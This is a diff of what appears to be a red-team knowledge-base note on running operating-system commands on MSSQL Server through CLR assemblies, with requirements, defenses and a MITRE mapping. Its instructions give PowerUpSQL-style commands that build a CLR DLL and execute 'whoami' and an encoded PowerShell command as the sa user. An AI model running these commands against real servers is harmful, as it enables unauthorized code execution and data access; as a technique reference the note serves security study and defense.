@@ -41,11 +41,15 @@ From a technical perspective, this technique involves creating a CLR assembly th
 
 The business value of this technique is that it allows attackers to gain unauthorized access to sensitive data and systems, which can lead to data theft, system compromise, and financial loss.
 
+ 
+
 ## Requirements
 
 1. Access to a MSSQL Server
 
 1. Permissions to create and load CLR assemblies on the server
+
+ 
 
 ## Defense
 
@@ -55,11 +59,15 @@ The business value of this technique is that it allows attackers to gain unautho
 
 1. Monitor for unauthorized CLR assembly creation and loading
 
+ 
+
 ## Objectives
 
 1. Execute arbitrary commands on a MSSQL Server
 
 1. Bypass security controls and gain unauthorized access to sensitive data and systems
+
+ 
 
 # Instructions
 
@@ -76,7 +84,13 @@ For example, to execute the `whoami` command, use the following command:
 
 `Invoke-SQLOSCmdCLR -Username sa -Password <password> -Instance <instance> -Command "whoami" -Verbose`
 
+ 
+
+
+
 **Code**: [[# Create C# code for the DLL, the DLL and SQL quer]]
+
+
 
 > The `Invoke-SQLOSCmdCLR` command is used to execute a command on a SQL Server instance using a Common Language Runtime (CLR) assembly. This command requires the `Create-SQLFileCLRDll` command to be run first to create the necessary DLL and SQL query files.
 
@@ -86,11 +100,17 @@ The `Command` argument is used to specify the command to execute on the SQL Serv
 
 The `Verbose` argument is optional and can be used to display detailed output. If this argument is not specified, only basic output will be displayed.
 
+
+
 **Command** ([[Create C# code for the DLL, the DLL and SQL query with DLL as hexadecimal string]]):
 
 ```bash
 Create-SQLFileCLRDll -ProcedureName "runcmd" -OutFile runcmd -OutDir C:\Users\user\Desktop
 ```
+
+
+
+
 
 **Command** ([[Execute command using CLR assembly]]):
 
@@ -98,11 +118,19 @@ Create-SQLFileCLRDll -ProcedureName "runcmd" -OutFile runcmd -OutDir C:\Users\us
 Invoke-SQLOSCmdCLR -Username sa -Password <password> -Instance <instance> -Command "whoami" -Verbose
 ```
 
+
+
+
+
 **Command** ([[Execute command using CLR assembly]]):
 
 ```bash
 Invoke-SQLOSCmdCLR -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command "whoami" Verbose
 ```
+
+
+
+
 
 **Command** ([[Execute command using CLR assembly]]):
 
@@ -110,11 +138,17 @@ Invoke-SQLOSCmdCLR -Username sa -Password Password1234 -Instance "<DBSERVERNAME\
 Invoke-SQLOSCmdCLR -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command "powershell -e <base64>" -Verbose
 ```
 
+
+
+
+
 **Command** ([[List all the stored procedures added using CLR]]):
 
 ```bash
 Get-SQLStoredProcedureCLR -Instance <instance> -Verbose
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -142,3 +176,5 @@ Get-SQLStoredProcedureCLR -Instance <instance> -Verbose
 - [[CLR Assemblies]]
 - [[Execute commands using CLR assembly]]
 - [[MSSQL Server]]
+
+
